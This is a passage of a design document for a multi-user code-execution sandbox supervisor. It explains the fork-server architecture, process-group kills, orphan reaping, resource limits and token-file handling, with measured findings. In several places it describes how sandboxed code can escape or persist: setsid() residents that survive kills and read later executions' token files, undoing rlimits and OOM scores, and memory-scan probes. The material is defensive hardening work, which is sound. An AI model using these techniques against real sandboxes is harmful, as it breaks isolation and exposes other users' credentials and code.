-* **The terminator set is all four shapes `http.client.parse_headers` stops on**, `\r\n\r\n`,
-  `\n\r\n` and `\n\n` (`\r\n\n` contains `\n\n`). This is load-bearing rather than pedantic:
-  with `\n\r\n` missing, a head using it was measured never to terminate here — the whole body
-  copied onto the heap, left in the scratch because the `finally` never ran, and the request
-  blocked in `recv_into` instead of being refused. Not reachable from the deployed path (the
-  API pod's client library emits CRLF and the network policy admits nothing else), but the
-  properties above are absolutes and it made all of them false.
-* **The request line and headers are still materialised**, necessarily: nothing can route a
-  request it has not parsed. The contract carries tokens and code in the body, so this excludes
-  what the threat model is about — but a caller that puts a secret in a *header* gets no
-  protection from it.
-* Cost, measured (n=5000/arm, keep-alive, `TCP_NODELAY` and `disable_nagle_algorithm` in every
-  arm — without both, a 40 ms delayed-ACK stall swamps the signal). **These are A/B figures for
-  the header read, not production latencies**: the shipped `_Handler` does *not* set
-  `disable_nagle_algorithm`, and `_send_json`'s two `sendall`s therefore do pay that
-  delayed-ACK stall on the write path (~41 ms on a real `GET /health`) — pre-existing, arm
-  independent, and tracked separately. Under that harness: `GET /health` 784.7 µs
-  buffered → 816.2 µs peeking (+4%, 2 `recv` syscalls vs 1); `POST` with a 679-byte body
-  936.1 µs → 997.8 µs (+7%, 3 vs 1.28). The candidate this replaced, plain `rbufsize = 0`, cost
-  **+100%** on `/health` (1567 µs, 74 syscalls) because `socket.makefile` then returns a raw
-  `SocketIO` whose `readline()` degrades to near byte-at-a-time — a 60%+ regression on every
-  kubelet probe, where there is no body to protect.
-
-The whole head is now bounded to `MAX_HEADER_BYTES` (64 KiB) and a head that does not terminate
-inside it is refused **431** with the connection closed, before anything is routed and before
-any body is read — a head with no terminator has no body by construction, and `_read_head`
-raises out of the peek loop without ever consuming past what it has already treated as head.
-Previously the equivalent bound was per line (`http.client._MAXLINE`, 64 KiB) and an over-long
-request line answered 414. The 100-header cap (`http.client._MAXHEADERS`) is *unchanged* —
-`parse_headers` still enforces it on the head this reader hands over, answering 431 exactly as
-it did before.
-
-**And since `4h6.58` the head read carries the deadline the contract claims for it.** The arm
-and the disarm both live inside `_read_head`, on every path including both raises, and that
-placement is the whole of the fix rather than an implementation detail: `_read_body`'s `finally`
-does `settimeout(None)`, so a deadline armed once per *connection* — in `setup()`, the obvious
-place — is gone by the time the **second** request on a kept-alive connection reads its head. It
-would work once and then silently stop working. Arming per head instead means nothing
-`_read_body` does to the socket can outlive it. One deadline covers the whole head rather than
-each `recv`, because a per-`recv` timer is reset forever by a peer dripping a byte at a time —
-the same peer shape the rolling seam window above exists for. `SUPERVISOR_TEST_ARM_ONCE=1` in
-`scripts/test-supervisor.py` restores the once-per-connection arming and turns the keep-alive
-check red while leaving the first-request check green, which is exactly the shape of the trap.
-
-#### Which process holds token bytes, and how the child gets its credential
-
-| process | ever holds a token / request body / another user's code? |
-|---|---|
-| supervisor (HTTP front door) | **Yes** — it parses the request and writes the token file. It no longer forks execution children. |
-| fork server | **No Python object holding one**, ever: its address space is a snapshot of a supervisor taken before `_read_body` or `parse_execute_request` ran for any request (the readiness gate enforces that), and nothing user-shaped is ever sent to it afterwards. **No raw body bytes either, since `4h6.87`**: `_HeaderBoundedReader` consumes exactly the request head and leaves the body in the kernel queue. Residual, stated above and not rounded away: the request line and headers *are* parsed into the heap, and up to 511 body bytes (plus at most 2 in the 6-byte seam window) sit in two fixed, in-place-zeroed buffers for the microseconds between the peek and the wipe of the same call. |
-| execution child | Its **own** token only, and only once the SDK reads the file. |
-
-The credential route is `4h6.43`'s read-once token file, and `4h6.55`'s judgement that the
-file "buys nothing against the process it is protecting from" was a judgement about the
-*forking* process. Option (b) changes which process that is, and in doing so turns the file
-into the load-bearing part of the design: the supervisor writes `/scratch/<id>/tokens.json`
-mode 0600, names its path in the child's environment, and the child opens it. **That is a
-route from the supervisor to the child that does not pass through the process in between**,
-which is exactly what option (b) needs and what an argument-passing design cannot provide.
-
-#### What prewarm costs now
-
-Nothing extra. The fork server inherits the prewarmed `numpy`/`scipy`/`polars`/`matplotlib`
-pages from the supervisor and hands them to every child copy-on-write, exactly as before; the
-child still never execs. The cost is one additional long-lived process whose pages are shared
-rather than copied, and one socket round trip per execution. This is the entire reason (b) was
-chosen over (a), which would have paid a cold import on every execution.
-
-#### When the fork server fails: fail closed, and let Kubernetes replace the pod
-
-A second long-lived process is a second thing that can die, and all four failure paths were
-originally silent. They are handled by failing closed — never by restarting the fork server in
-process, which would re-fork it from a supervisor that *has* served requests and re-open
-finding 1 exactly.
-
-- **A failed control round trip poisons the socket permanently.** The control socket is
-  `SOCK_SEQPACKET`, so framing cannot be lost — but *alignment* can: a send that succeeded and
-  a receive that timed out leaves the peer's reply queued, and the next round trip reads the
-  previous request's answer. Measured: after an `FS_OP_WAIT` timed out, the next `FS_OP_REAP`
-  returned that `WAIT`'s `{"ok": true}`. The dangerous ordering is a **fork** whose reply is
-  lost — the fork server did fork the child and did send its pid, so the next execution would
-  adopt that stale pid and apply its limits to, watchdog, `killpg` and reap *another user's
-  child*, while its own child ran with no wall clock, no pid budget and no reaper, and reported
-  an exit status from the wrong process. So `ForkServer._round_trip` sets a broken flag inside
-  the lock on any exception, closes the socket, and every later call raises immediately. An
-  `{"error": ...}` reply is *in band* — the message was received and answered — and does not
-  poison anything.
-- **`/health` reports it.** `Supervisor.health()` calls `ForkServer.alive()`
-  (`waitpid(pid, WNOHANG)` plus the broken flag) and answers `503 forkserver-down`. Without
-  this a `SIGKILL`ed fork server left every `/execute` answering `500` forever while `/health`
-  answered `200 ok`; `k8s/deployments/sandbox.yaml` has a `readinessProbe` and deliberately no
-  `livenessProbe`, so nothing de-endpointed or replaced the pod. This is not a remote
-  possibility: the fork server shares the supervisor's pages so its RSS reads high, and it
-  keeps the inherited `oom_score_adj` of 0 while only the **child** is raised to 500 — it is a
-  plausible cgroup-OOM victim. Restoring service is the deployment's job (`4h6.50`), and 503
-  is what lets it do it.
-- **A fork server that dies mid-execution still gets its child killed.** `_reap` raises when
-  the control socket is gone, and `_execute_inner`'s `finally` used to set `job.done` first —
-  which makes `_watchdog` return without firing a limit and without killing anything, so the
-  user's code kept running for the pod's lifetime, holding CPU, memory and same-uid write
-  access to `/scratch` while later users executed. The `finally` now kills the group whenever
-  the job was forked and not reaped, *before* setting `job.done`. `_kill_group` uses
-  `os.killpg`/`os.kill` directly and never the control socket, so it works with a dead fork
-  server.
-- **A child whose `{"pid": n}` reply was lost is killed by the fork server itself.** Poisoning
-  (above) stops a stale pid being *misattributed* to the next execution, which was the dangerous
-  half, but it does not reach the process: the fork succeeded, the supervisor's round trip failed
-  before reading the answer, so `job.pid` stays `None` and neither `_execute_inner`'s `finally`
-  nor the watchdog has a pid to kill — the supervisor cannot name that process at all. This was
-  **introduced by the fork server**: before it, the supervisor forked directly and always knew
-  the pid. Left alone, the poisoned socket closes, the fork server exits on EOF and the child
-  reparents to the supervisor (PID 1 in the pod), which never waits for it — user code running at
-  uid 65532 with write access to `/scratch` for the pod's lifetime, alongside later users'
-  executions. So the fork server **keeps the set of pids it has forked and not yet been asked to
-  reap** (`FS_OP_REAP` removes a pid when it actually consumes it, or when `waitpid` says the pid
-  is not its child), and whatever is left when the control loop ends — EOF, socket error or an
-  abort — is killed and reaped by `_fs_kill_pending` before it exits: `SIGTERM`, then `SIGKILL`
-  after `KILL_GRACE_S`, one grace for the whole batch rather than one per child. Delivery is
-  `os.killpg` on the child's **own** group with the same guard as `_resolve_pgid` (shared as
-  `_own_pgid`): a child that has not reached `_child_main`'s `setsid()` yet reports the fork
-  server's group — which is the *supervisor's* group, since the fork server deliberately does not
-  `setsid()` — and is signalled by pid alone rather than taking the pod's own group down. This
-  cleanup can only run after the loop has ended, so no further `FS_OP_REAP` can arrive and it can
-  never steal a zombie the supervisor is waiting for; the normal reap path is untouched. It is
-  *not* a general zombie sweep — the fork server does not reap on a timer, only at exit. The
-  hazard class is the one `4h6.83` tracks, but this instance was opened here and is closed here.
-
-#### What this does NOT close — do not read it as more than it is
-
-- **Finding 2, cross-execution artifact read and overwrite.** One uid and one flat `/scratch`:
-  a child can list `/scratch`, read another execution's `artifacts/`, overwrite files there,
-  and plant new ones. Untouched by the fork server, which changes nothing about the filesystem.
-  It has since been **split in half**: the **integrity** half — the retention window serving
-  attacker-controlled content under another user's execution id — is **closed** by the manifest
-  digests described under `GET /artifact` above (`genetics-results-suite-4h6.82`). The
-  **reading** half is `genetics-results-suite-4h6.88`: the **retained** window is closed by
-  encrypting every artifact in place under a per-execution key held only in supervisor memory,
-  and the **live** window — a resident reading while the execution is still running, when the
-  child's own plaintext `open()` is what put the bytes there — is **open**. Under one uid no
-  *filesystem* mechanism bounds either; encryption is not a filesystem mechanism, which is why
-  it reaches the first half and cannot reach the second. See "Artifact encryption at rest".
-- **Finding 3, a `setsid()` resident that survives every group kill** (`genetics-results-suite-4h6.83`).
-  A detached grandchild of an earlier execution polls `/scratch`, reads the *next* execution's
-  mode-0600 token file inside the read-once window, and is unreachable by `killpg` because it
-  left the process group. The fork server as originally built did not touch it: that route
-  depends on one shared uid and a file with a name, not on what the forking process holds in
-  memory, and the payload descriptor is deliberately anonymous so the change did not *widen*
-  it. What closes the **cross-execution** half is the fork server being a
-  **`PR_SET_CHILD_SUBREAPER`** and sweeping what reparents to it at the end of every execution
-  — see "What the kill path reaches" below. The **intra-execution** half is open by
-  construction and cannot be closed this way.
-
-`4h6.50` (wiring the supervisor into the manifest) and `4h6.51` (deploy-window verification)
-were blocked on `4h6.55` when it carried all three findings, and then on `.82` and `.83`. `.88`
-(the reading half) and the gVisor verification `.51` itself owns are what remain of that gate.
-Do not close `.88` by pointing at this section.
-
-#### How it is tested
-
-`scripts/test-supervisor.py`'s `cross-execution memory isolation` group is `4h6.55`'s own probe,
-run as a real execution in a real forked child: it hunts one victim's token, code and session id
-after that execution has **completed and been released**, and a second victim's while that
-request is **queued** behind the probe, by all four routes including the raw `/proc/self/mem`
-scan. **The positive controls are what make a clean result mean anything**: a string planted in
-the supervisor module *before* the fork server is forked must be found, and must be found by the
-memory scan specifically — so a `/proc` that stops being readable (gVisor, a hardened mount)
-turns the group red instead of letting it pass vacuously. A second control repeats the bead's
-sanity probe (a string dropped and `gc.collect()`-ed before the fork); it is reported rather
-than required, because an arena can legitimately be reused between the drop and the scan.
-Needles are carried into the probe as **split halves** and never concatenated, or the probe
-would find them in its own code object.
-
-### As built (`4h6.41`, `4h6.42`, `4h6.43`, `4h6.45`, `4h6.46`) — the per-execution limits, and what each one is worth
-
-`4h6.39`'s five holes. Four of them landed together in `sandbox/supervisor.py` because they
-share one poll loop and one kill path; `4h6.45` (the audit stream) followed. **Every limit
-below was watched firing in the real image** via `scripts/run-sandbox-local.sh --test`, not
-reasoned about; the checks live in `scripts/test-supervisor.py`'s `limits`, `tokens`,
-`retention`, `retained ceiling` and `audit stream` groups. The first four run in **both** modes.
-The `audit stream` group runs in container mode **only when `--container-name NAME` is given** —
-its output leaves by the container's stdout rather than over the wire — and skips by name
-otherwise; `run-sandbox-local.sh --test` supplies it. The `audit stream units` group, which
-calls `_AuditForwarder` and `_drain` directly, is in-process only and is listed among the groups
-container mode never invokes.
-
-#### One watchdog, one kill path, and the two reap hazards it had to be written around
-
-A single daemon thread per execution polls the wall clock, the process-group size and both
-`/scratch` quotas every 200 ms. Four timers would have given four chances to get the reap
-race wrong; the drain thread's 8 MiB cap enters the same path through a callback.
-
-**Hazard 1 — a `pgid` cached at fork time is a stale pointer at a recycled pid.** Once
-`waitpid` reaps the child its pid is free for reuse, so a watchdog that decided to kill a
-moment earlier can `killpg` a group that is plausibly *the next execution's child*. The fix
-is structural rather than a narrowed window: `waitid(P_PID, …, WEXITED | WNOWAIT)` blocks
-until the child exits **without** consuming the zombie — so the pid stays un-recyclable — and
-the actual `waitpid` and the `reaped` flag are then set together under a lock every signal
-path also takes. A plain blocking `waitpid` cannot do this; it reaps before any lock can be
-taken.
-
-**Hazard 2, and it was found by running the code, not by reading it — reading the pgid back
-right after the fork returns the SUPERVISOR'S OWN process group.** The child's `setsid()` is
-the first statement of `_child_main`, but the parent wins that race routinely: the harness
-logged `child pgid is 651696, not the 651474 recorded at fork`, and 651474 was the
-supervisor's group. Had that value been trusted, the first wall-clock timeout would have
-`SIGTERM`ed the supervisor and everything in its group. The parent cannot fix it by calling
-`setpgid(pid, pid)` itself either — that makes the child a group leader and `setsid()` then
-fails with `EPERM` for a group leader. So **no pgid is cached at all**: it is resolved live at
-every use by a helper that refuses to return the supervisor's own group, and a child that has
-no group of its own yet is signalled by pid alone. **`4h6.55`'s fork server deliberately does
-not `setsid()` for exactly this reason** — it stays in the supervisor's process group, so a
-child that has not yet reached its own `setsid()` still reports the supervisor's pgid and is
-still caught by that helper. A fork server in a group of its own would report a pgid the
-helper does not recognise, and the first `killpg` would take out the fork server and with it
-every future execution. Two consequences worth stating: the pid
-budget **skips** a poll rather than counting the supervisor's group against the child's
-budget, and `None` from the group scan means "unenforceable", never "empty".
-
-**What the kill path reaches, and what it does not.** Signalling reaches the child and every
-descendant that stayed in its process group — an ordinary script's `subprocess` children. A
-descendant that calls `setsid()` **leaves the group and is not signalled**; that was measured
-with `killpg` returning `ESRCH` while the escapee kept running, and it also defeats the token
-file (below). Two changes since, and both are about what happens at the **end** of an
-execution rather than about the signal itself:
-
-- **The success path now kills the group at all** (`genetics-results-suite-4h6.66`). There are
-  two `_kill_group` call sites — a limit firing, and the stranded path where the reap did not
-  complete — and a normal completion reaches neither, because both refuse a job that is already
-  reaped. MEASURED after a `status: ok` execution: a plain forked grandchild that had stayed in
-  the process group was still running, and would have been for the pod's lifetime. The
-  completion path now signals that group, resolving the pgid **while the zombie is still held**
-  by `waitid(WNOWAIT)` — the one moment the value cannot name anything else — and re-applying
-  the own-group guard before it signals.
-- **A `setsid()` escapee is reached by PARENTAGE, which it cannot leave**
-  (`genetics-results-suite-4h6.83`). `setsid()` changes the session and the process group and
-  **not** the parent, so with `PR_SET_CHILD_SUBREAPER` set on the **fork server** an escapee
-  whose parent exits reparents to the fork server rather than to PID 1. At the end of every
-  execution the supervisor asks it to sweep: it enumerates its own children through `/proc`,
-  excludes the pids it forked and has not been asked to reap (which is exactly how its own live
-  execution child is protected), and kills and reaps the rest. This needs **no seccomp profile
-  change and no namespaces**, which is why it is available where option (c) is not.
-
-**What that does not bound, and it must not be overread.** It bounds how long a survivor
-outlives **its own** execution, and the bound is a *depth*, not a guarantee of an empty pod.
-**A process reparents only when its own parent exits**, so a chain of `setsid()`'d processes
-becomes visible to the subreaper one level at a time and the sweep has to re-enumerate: it does
-so for at most `FS_SWEEP_MAX_ROUNDS` = 4 rounds within `FS_SWEEP_BUDGET_S` = 10 s, bounded
-because a stray that forks a fresh decoy each time it is reparented would otherwise spin the
-sweep indefinitely, and because overrunning `FS_CONTROL_TIMEOUT_S` would poison the control
-socket and take the fork server down with it. So **a chain of depth n needs n rounds**, one
-execution clears four levels, a deeper chain loses four more levels per subsequent execution,
-and the remainder is logged rather than passed over in silence. MEASURED against the
-single-pass version this replaced: a depth-2 chain (A `setsid()`s, forks B, B `setsid()`s, A
-stays alive) left B **running** — state `S`, not a zombie — for the whole of the next
-execution, because at enumeration time B's parent was still alive and nothing re-scanned; B is
-outside A's process group too, so the collateral `killpg` did not reach it either. It does
-**not** bound the intra-execution window: a process forked by execution A is alive for all of A
-by construction, and reparents only when A's child exits.
-`PR_SET_CHILD_SUBREAPER` and `/proc` parentage are both **UNVERIFIED UNDER gVISOR**, which
-implements prctl and `/proc` in the sentry; `4h6.51` owns measuring it, and a subreaper that
-does not take degrades to exactly the old behaviour and logs a warning rather than failing.
-This is still **not a containment boundary** — a PID namespace per execution is the mechanism
-that would be one, at the seccomp price recorded elsewhere in this document.
-
-**And PID 1 reaps what reparents past the fork server** (`genetics-results-suite-4h6.68`). The
-sweep above only ever sees a process that reparents **to the fork server**. Two cases skip it
-entirely: the fork server is dead — the `stranded` path `_execute_inner` already handles, after
-which survivors reparent to PID 1 — and `PR_SET_CHILD_SUBREAPER` being unavailable or failing,
-which `_fs_become_subreaper` only **warns** about, after which the sweep has nothing to
-enumerate and every escapee lands on PID 1 as well. The supervisor waited on nothing but its own
-fork server, so such a corpse stayed a zombie for the pod's lifetime. MEASURED: state `S`, then
-`Z` after a kill, still `Z` a second later, never `waitpid()`ed. **Each zombie costs a pid slot**
-against the kubelet's `pod_pids_limit` of 1024, permanently, on a `replicas: 1` pod that serves
-every later user until it restarts — and pid exhaustion is the same state in which a failed fork
-leaks descriptors, so the two compound. `main()` now installs a `SIGCHLD` handler running a
-bounded `waitpid(-1, WNOHANG)` loop; `install_orphan_reaper` and `_reap_orphans` are the two
-symbols.
-
-**What it does NOT cover, and none of this may be read as a bound on strays:**
-
-- **It reaps corpses. It does not kill anything.** A live `setsid()`'d descendant — still
-  running, still holding a pipe write end, still burning CPU — is untouched by reaping. Killing
-  strays is the fork server's sweep, and where the sweep misses, nothing kills them. The drain
-  deadline above is what keeps such a process from costing a thread as well.
-- **One delivery reaps at most `ORPHAN_REAP_MAX_ROUNDS` = 64.** The cap is not decoration: this
-  runs in a signal handler in PID 1, and an unbounded `waitpid` loop there is its own hazard —
-  a peer forking and dying faster than the loop reaps would pin the main thread inside the
-  handler. **Why 64 is enough is the delivery behaviour, not a pid budget.** An earlier wording
-  here justified it as "far above the number of descendants a single execution can strand",
-  which is false: `PID_BUDGET` = 32 is enforced over `_group_members(pgid)` — **process-group
-  membership only** — and a `setsid()` descendant leaves that group (measured; it is why
-  `FS_OP_SWEEP` enumerates by parentage instead), so one execution can strand well past 64,
-  bounded only by `pod_pids_limit` 1024. What makes the cap safe is that `SIGCHLD` deliveries
-  are not coalesced in practice — each child death raises the pending flag again and the eval
-  loop re-runs the handler — so a remainder is taken by the next delivery rather than kept. The
-  residual is a remainder with **no later child death at all**, and it is stated here rather
-  than pretended away.
-- **The handler is silent and cannot raise, and making it silent took more than declining to
-  write a log call.** It used to reach `LOG.error` anyway, through `_reap_orphans` →
-  `ForkServer.note_reaped` → `_mark_broken`. MEASURED with `main()`'s exact logging setup — a
-  `StreamHandler` on a `BufferedWriter` over a stdout pipe whose consumer had stalled, i.e. a
-  congested container log stream — that raised `RuntimeError: reentrant call inside
-  <_io.BufferedWriter>` *inside* the handler; the exception escaped `note_reaped`, was not
-  caught by `_reap_orphans`' `OSError` guard, and aborted the delivery with 4 of 5 zombies
-  unreaped — permanently, since `SIGCHLD` is not queued. The reaper path now **records** its
-  reason without emitting it (`_mark_broken(log=False)`) and `ForkServer.alive()` flushes it
-  from a serving thread, which is where `/health` already reads the broken state, so the line
-  that matters most in that file — *the control socket is unusable and will not be reused* — is
-  still printed exactly once instead of being lost to `_broken` having been set before the log
-  call. **`alive()` has exactly one caller** — the `/health` branch in `Supervisor.health()` —
-  so the parked reason surfaces on the **next readiness probe and nowhere else**: a fork server
-  that dies during shutdown, after the last probe, prints nothing at all. Ordinary serving-thread callers of `_mark_broken` keep logging inline. The handler still
-  swallows everything as well, because an exception out of a handler surfaces at an arbitrary
-  bytecode in the main thread, and each publisher is called inside its own guard so that one
-  raising cannot cost the remaining zombies their reap.
-- **It is installed by `main()` alone**, after `bring_up()`. A process that imports the module
-  and drives it directly runs no reaper for the length of its life, which is what keeps
-  `_SelfWaiter` — the waiter for a child of *this* process — usable there; a generic
-  `waitpid(-1)` in the same process would turn its `waitpid` into `ECHILD`. The stronger
-  sentence, that "the test harness has no reaper", is **not** true and was: `scripts/test-
-  supervisor.py` calls `install_orphan_reaper` directly in one check. That check forks only its
-  own child and restores the previous `SIGCHLD` disposition in a `finally`, so no `_SelfWaiter`
-  user ever shares a process with a live reaper — there is no live hazard, only a claim that had
-  to be narrowed. Nothing in the image uses `_SelfWaiter` at all, because every execution child
-  is a *grand*child of the supervisor while the fork server lives.
-
-**The two collisions, and how each is resolved.** `waitpid(-1)` cannot be told to skip a pid —
-it reports which child it took only *after* taking it — so the reaper **publishes rather than
-skips**: every pid it consumes is handed to whoever might have been waiting for it, and nothing
-is left polling or signalling a pid that is gone.
-
-1. **The fork server's own pid.** `ForkServer.note_reaped` records the status, clears `pid` and
-   marks the handle broken (silently — see above), after which `alive()` answers `False` without
-   a syscall and `close()` has nothing left to wait for. That closes the dangerous ordering in
-   which `close()`'s grace loop polls a pid the reaper had already consumed and then sends
-   `SIGKILL` to a pid the kernel is free to have handed to somebody else. `close()` additionally
-   sets a plain `_closing` flag **first**, and the reaper stands down entirely while it is set,
-   so no reap can land between that loop's last poll and its kill.
-2. **The running execution's child — and the earlier wording here denied this one existed.** It
-   said a supervisor-side reaper cannot steal an execution's wait status, because the
-   `waitid(P_PID, WEXITED|WNOWAIT)` discipline `4h6.41` established lives in the **fork server**
-   and execution children are the supervisor's grandchildren, so that wait happens in another
-   process entirely. **That is true only while the fork server is alive**, and the exception is
-   one of the exact two cases this reaper exists for: when the fork server dies mid-execution
-   (`test_forkserver_death_mid_execution` drives it) the child reparents to PID 1 and becomes a
-   **direct child of the supervisor**, so `waitpid(-1)` takes its status. `_reap` has already
-   raised `ForkServerError` by then, so `job.reaped` stays `False` and `job.pid` still names it,
-   which breaks the invariant `_kill_group` states: *a zombie keeps its pgid and its pid cannot
-   be recycled until it is reaped*. Once the reaper has reaped it the number is reusable, while
-   `_signal_group` guards only on `job.reaped` — so the stranded path spent the full
-   `KILL_GRACE_S` polling a job that could never go reaped and then `SIGKILL`ed that number,
-   and `_watchdog` → `_fire_limit` → `_kill_group` reached the same place for a timeout.
-   MEASURED as real PID 1 in a pid namespace with `ns_last_pid` forcing reuse: a bystander
-   forked onto the same number was alive before the signal and gone after it. A second harm
-   needed no recycling at all — `_resolve_pgid` returns `None` for a pid that no longer exists,
-   so the log gained the flatly false line *"child has no process group of its own; signalling
-   pid N alone"* about a child that had `setsid()`'d into its own group.
-
-   **What makes it safe now** is the same publishing move: `Supervisor.note_child_reaped`
-   records the status on the running job, sets `reaped` and clears `pid`, so `_signal_group` and
-   `_kill_group` answer `_SIGNAL_GONE` at their first guard, `_resolve_pgid` returns `None`
-   without reading `/proc`, and nothing signals a number that no longer names the child. The
-   case is no longer silent either: `_execute_inner` logs at ERROR that the fork server died and
-   the PID 1 reaper consumed the child's status, in place of the *"the reap did not complete"*
-   line it used to print.
-
-   **The publisher clears `reaped_pgid` too, and an earlier revision of this section did not say
-   so because it had missed the second path.** `_reap` stamps `job.reaped_pgid` **before** the
-   `waitpid` that can raise, so a fork server dying between the `FS_OP_WAIT` reply and the
-   `FS_OP_REAP` reply leaves the pgid stamped while `reaped` is still `False` — the `stranded`
-   branch is then *not* taken, and `_execute_inner`'s `else` branch calls `_kill_survivors`
-   **unconditionally** on that pgid. For a `setsid()` child the pgid **is** the child's pid,
-   which the reaper has just made recyclable, so the harm is the same one, in a narrower window
-   and on the *completion* path. MEASURED under `unshare -Urpf --mount-proc` with `ns_last_pid`:
-   a bystander forked onto pid 117 was alive before, the supervisor announced *"the execution
-   completed but its process group 117 still has members; killing them"* about what was in fact
-   an unrelated process, and it was gone after. `note_child_reaped` now clears the slot, and
-   `_kill_survivors` — its **only** reader — treats `None` as nothing to do, which is already how
-   it handles a child that never reached `setsid()`. It also refuses to publish onto a job whose
-   `reaped` is already set: `_reap` never clears `job.pid` and `_release` does not clear
-   `_running` until the whole response is built, so a normally-reaped job could otherwise be
-   matched on a recycled pid and take a foreign status (measured: `reaped_status = 1337`).
-
-   **What genuinely remains** is one signal, once: a `_signal_group` that has *already* passed
-   its `job.reaped` check when the handler runs will still deliver **that one signal**. The
-   window is a single `_resolve_pgid`, **measured at 3.1 microseconds** between the guard and the
-   `os.kill`/`os.killpg`. It is not closable — no ordering can put the kill before the reap,
-   because `waitpid` reports whose status it took only after taking it — and taking the lock
-   would only serialise it, not reorder it. **The escalation is refused**: a second
-   `_signal_group` answers `_SIGNAL_GONE` (measured), so the two-second grace loop, the `SIGKILL`
-   at the end of it and every later signal are all gone, which is where the exposure was.
-
-**Neither publisher takes a lock, and that is the same decision for both.** The handler runs
-inside `SIGCHLD`, which CPython delivers on the **main thread**; a serving thread holds
-`job.kill_lock` across the whole of `_signal_group` and `Supervisor._lock` across every queue
-decision, and a handler that blocks on a lock the interrupted thread holds deadlocks PID 1 —
-there is no timeout to fall back on and no other thread to run the handler. Every access on
-both paths is a single attribute load or store, `_running` and `pid` are each read once into a
-local, and both flags a signal path consults are OR-ed, so no reader can observe a half-published
-state that claims "not reaped" about a pid that is gone. `_closing` is a bool for the same
-reason, and `main()` calls `close()` on the main thread, so the flag is set before any later
-handler invocation can read it.
-
-#### `4h6.41` — wall clock, memory, oom_score_adj, pid budget
-
-| control | value | what fires, and what it is worth |
-|---|---|---|
-| wall clock | request `timeout_s`, default 60 s, hard ceiling 120 s (rejected, never clamped) | `SIGTERM` the group at the deadline, `SIGKILL` after `KILL_GRACE_S` (2 s), answer `200` with `status: "timeout"`, `error.type: "Timeout"`, `error.limit: null` |
-| `RLIMIT_AS` | 2560 MiB = `limits.memory` 3Gi − 512 MiB supervisor headroom, **soft and hard** | set in the **child**, because `setrlimit` on another process needs `CAP_SYS_RESOURCE`, which the pod drops. An over-large allocation is a clean `MemoryError` inside the child rather than a cgroup OOM kill whose victim the kernel picks by RSS heuristic — and which gVisor's accounting changes again, since the sentry holds memory on the application's behalf |
-
-**The hard limit is lowered too, and that is the whole control.** Setting only the soft limit
-made this **opt-out**: raising a soft limit back up to the hard limit is unprivileged, so
-`setrlimit(RLIMIT_AS, (RLIM_INFINITY, RLIM_INFINITY))` from the script succeeded — **measured
-in the real image**, after which allocating 2900 MiB produced exactly the cgroup OOM kill
-(`sig=9`) the limit exists to prevent. Lowering a hard limit *is* unprivileged and is
-irreversible without `CAP_SYS_RESOURCE`, which the pod drops, so the child cannot undo it. The
-harness asserts the undo is **refused**, in both modes, rather than asserting the soft value.
-| child `oom_score_adj` | raised to `+500` from the parent | see below; weaker than section 2 implies |
-| supervisor `oom_score_adj` | **not set, and nothing pretends to** | `-500` returned `EPERM` for the supervisor's own file *and* for the child's, measured. Lowering below the inherited floor needs `CAP_SYS_RESOURCE`. Section 2's `-500` is a **pod-spec change** (`4h6.50`), not a runtime one |
-| pid budget | 32 processes in the child's group | supervisor-side watch via `/proc/<pid>/stat`'s `pgrp` field. `RLIMIT_NPROC` is **advisory only** here: it is per real uid across the pid namespace and the two processes share uid 65532, so a child forking to its limit also stops the *supervisor* forking. Over budget kills the whole group: `status: "limit"`, `error.type: "PidLimit"` |
-
-**`RLIMIT_AS` is sized against the POD's budget, and the local container's behaviour is
-deliberately ignored.** `4h6.40` measured that the local `/scratch` is a tmpfs whose page
-cache is charged to the container's *own* 3 GiB memory cgroup (113 MiB → 414 MiB after a
-300 MiB write), while the pod's `emptyDir` is node-disk-backed and charged to
-`ephemeral-storage` (1Gi/2Gi), **never** to `limits.memory`. Tuning to the local behaviour
-would be up to 512 MiB more conservative than the pod needs. **The divergence a reader will
-hit:** a script holding ~2.4 GiB while `/scratch` holds 400 MiB can be cgroup-OOM-killed
-*locally* and run fine in the pod. The number is therefore hard-coded from
-`k8s/deployments/sandbox.yaml` rather than read from `/sys/fs/cgroup`.
-
-**`RLIMIT_AS` bounds virtual address space, not RSS, and the prewarmed child does not start
-from zero.** Measured inside the image: a child that has inherited `prewarm()`'s
-numpy/scipy/polars/matplotlib mappings already has `VmSize` ~1358 MiB against `VmRSS`
-~113 MiB, because BLAS reserves far more than it touches. So the script's own allocation
-headroom under the 2560 MiB limit is **~1.2 GiB, not ~2.5 GiB**. Raising the limit to
-"fix" that would spend the supervisor's headroom, which is the one thing keeping the cgroup
-OOM killer from having to choose between the two processes.
-
-**What the `oom_score_adj` raise is actually worth, measured rather than assumed.** The child
-starts at `0` (inherited). Writing `500` succeeds. Writing `0` again **also succeeds, from
-inside the child, at any time** — only going *below* the inherited floor is refused (`-500` →
-`EPERM`). So a script can undo it, and the honest guarantee is not "+500 holds" but "the
-child can never make itself a *better* OOM candidate than the supervisor": its adjustment
-stays in `[0, 1000]` against the supervisor's `0`. Section 2's Memory row reads as though the
-`+500`/`-500` pair is durable in both directions; neither half is, and this row is the
-authoritative one.
-
-#### `4h6.42` — the two output bounds, which are different limits
-
-- **Pipe cap, 8 MiB.** The reader **stops** at the cap and kills the group; it does not drain
-  and discard, because the cap exists so the supervisor's memory and the pod's CPU stop being
-  consumed and draining achieves neither. `output_bytes` therefore stops at the cap too,
-  which is what that field means on the wire. Answer: `status: "limit"`,
-  `error.type`/`error.limit` `"OutputLimit"`, `output_truncated: true`. A child blocked
-  writing to the now-unread pipe still dies — a pipe write is an interruptible sleep, so
-  `SIGTERM`'s default disposition ends it, and `SIGKILL` follows 2 s later regardless.
-- **Return window, 64 KiB.** First 32 KiB + `\n...[<N> bytes elided]...\n` + last 32 KiB, the
-  marker additional to the budget. Head **and** tail because the traceback is at the tail;
-  head-only truncation is the expensive failure shape, since the model then debugs against
-  output it cannot see.
-- **The cut is on bytes and never through a character.** Up to 3 bytes are trimmed from each
-  side onto a UTF-8 boundary and **counted into `<N>`**, so head + tail + elided accounts for
-  every byte. Without this the split introduces U+FFFD at both seams; the harness prints
-  `'x' + 'é' * 200000` specifically so the boundary lands mid-sequence rather than neatly
-  between two characters.
-- **`output_truncated` is true for either cause** — the pipe cap fired, or the window elided a
-  middle.
-- **stderr is interleaved into the same pipe as stdout** (settled by `4h6.39`, restated
-  because `4h6.42` was asked to record the decision): section 2 budgets **one** 64 KiB window,
-  and splitting it across two streams either halves the window or doubles the budget. The
-  SDK's audit records **are** separated out, onto their own fd (`4h6.45`), so they are not
-  charged against this window and are not indistinguishable from script output.
-
-#### `4h6.43`/`4h6.44` — the read-once token file, which is NOT an exposure bound
-
